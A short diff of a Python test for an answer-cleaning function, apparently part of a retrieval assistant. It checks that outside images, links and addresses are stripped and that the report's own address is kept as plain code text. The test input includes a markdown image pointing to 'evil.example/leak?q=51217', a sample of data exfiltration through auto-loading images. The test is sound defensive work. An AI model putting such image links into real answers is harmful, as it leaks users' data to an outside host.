@@ -83,7 +83,7 @@ def test_the_wrong_language_and_an_answer_with_no_source_are_soft_problems(monke
 
 def test_outside_images_links_and_addresses_are_removed_but_the_reports_own_address_stays():
     answer = "Revenue ![x](https://evil.example/leak?q=51217) was high, see [the site](https://evil.example) or https://evil.example/a and https://investors.nike.com [1]."
-    assert policy.clean(answer, CHUNKS) == "Revenue  was high, see the site or  and https://investors.nike.com [1]."
+    assert policy.clean(answer, CHUNKS) == "Revenue  was high, see the site or  and `https://investors.nike.com` [1]."  # text, not a link (19/11)
 
 
 def _answers(monkeypatch, *replies):
